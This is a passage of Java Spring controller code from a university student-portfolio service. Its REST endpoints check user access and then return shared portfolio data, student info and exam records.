		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);

		// check if can access portfolio
		if (!canRead(user.getSocialId(), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<String> udList = p.getShowUserGeneratedData();
		// if no data is shared, neither the student exams are
		if (udList == null || udList.isEmpty())
			return null;

		String userId = p.getUserId();
		String updString = portfolioManager.getUserUNITNData(userId);
		if (updString == null)
			return null;
		obj = new DomainObject(updString);
		UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
		upd.setId(obj.getId());

		if (!udList.contains(obj.getId())) {
			return null;
		}

		String seString = portfolioManager.getStudentExams(userId);

		if (seString != null && !seString.isEmpty()) {
			obj = new DomainObject(seString);
			StudentExams se = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
			se.setId(obj.getId());
			seList.add(se);
		}

		return seList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.UserProducedData/portfolio/{portfolioId}")
	public @ResponseBody
	List<UserProducedData> getUserProducedDataByPortfolio(HttpServletRequest request, HttpServletResponse response,
			@PathVariable String portfolioId) throws Exception {
		List<UserProducedData> updList = new ArrayList<UserProducedData>();
		// List<String> list = getUserProducedDataList(request, response, null);

		// check the current user
		User user = getUser(request);
		String currentUserId = getUserId(user);
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);

		// check if can access portfolio
		if (!canRead(user.getSocialId(), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<String> udList = p.getShowUserGeneratedData();
		// if no data is shared, neither the student exams are
		if (udList == null || udList.isEmpty())
			return null;

		if (udList != null) {
			for (String s : udList) {
				String updString = portfolioManager.getUserProducedData(s);
				obj = new DomainObject(updString);
				UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
				upd.setId(obj.getId());
				updList.add(upd);
			}
		}

		return updList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.SharedPortfolioContainer/{entityId}")
	public @ResponseBody
	SharedPortfolioContainer getSharedPortfolio(HttpServletRequest request, HttpServletResponse response,
			@PathVariable Long entityId) throws Exception {
		// check the current user
		User user = getUser(request);
		String currentUserId = getUserId(user);
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getPortfolioByEntityId(entityId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
		p.setId(obj.getId());

		// check if can access portfolio
		if (!canRead(user.getSocialId(), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		SharedPortfolioContainer container = new SharedPortfolioContainer();
		container.setPortfolio(p);

		StudentInfo si = null;

		String siString = portfolioManager.getStudentInfo(p.getUserId());
		if (siString != null && !siString.isEmpty()) {
			DomainObject siObj = new DomainObject(siString);
			si = PortfolioUtils.convert(siObj.getContent(), StudentInfo.class);
			si.setId(obj.getId());
		} else {
			si = new StudentInfo();
			si.setStudentData(new StudentData());
		}
		if (!p.getUserId().equals(currentUserId)) {
			List<String> shown = p.getShowStudentInfo();
			si.getStudentData().filterData(shown);
		}
		container.setStudentInfo(si);

		Map<String, Object> profileMap = profileManager.getMinimalProfile(p.getUserId(),
				request.getHeader(AcProviderFilter.TOKEN_HEADER), profileServiceUri);
		if (profileMap != null) {
			StudentData sd = container.getStudentInfo().getStudentData();
			sd.setName((String) profileMap.get("name"));
			sd.setSurname((String) profileMap.get("surname"));
		}

		List<String> udList = p.getShowUserGeneratedData();
		// if no data is shared, neither the student exams are
		if (udList == null || udList.isEmpty())
			return null;

		ArrayList<UserProducedData> updList = new ArrayList<UserProducedData>();
		boolean showExams = false;
		if (udList != null) {
			List<String> all = portfolioManager.getAllUserProducedData(p.getUserId());
			for (String s : all) {
				obj = new DomainObject(s);
				if (udList.contains(obj.getId())) {
					UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
					if (PortfolioManager.STUDENT_EDU_CATEGORY.equals(upd.getCategory())
							&& PortfolioManager.STUDENT_EDU_TYPE.equals(upd.getType())) {
						showExams = true;
					}
					upd.setId(obj.getId());
					updList.add(upd);
				}
			}
			// for (String s : udList) {
			// String updString = portfolioManager.getUserProducedData(s);
			// obj = new DomainObject(updString);
			// UserProducedData upd = PortfolioUtils.convert(obj.getContent(),
			// UserProducedData.class);
			// if
			// (PortfolioManager.STUDENT_EDU_CATEGORY.equals(upd.getCategory())
			// && PortfolioManager.STUDENT_EDU_TYPE.equals(upd.getType())) {
			// showExams = true;
			// }
			// upd.setId(obj.getId());
			// updList.add(upd);
			// }
		}
		container.setSharedProducedDatas(updList);

		if (showExams) {
			ArrayList<StudentExams> seList = new ArrayList<StudentExams>();
			String seString = portfolioManager.getStudentExams(p.getUserId());
			if (seString != null && !seString.isEmpty()) {
				obj = new DomainObject(seString);
				StudentExams se = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
				se.setId(obj.getId());
				seList.add(se);
			}
			container.setSharedStudentExams(seList);
		}

		return container;
	}

}
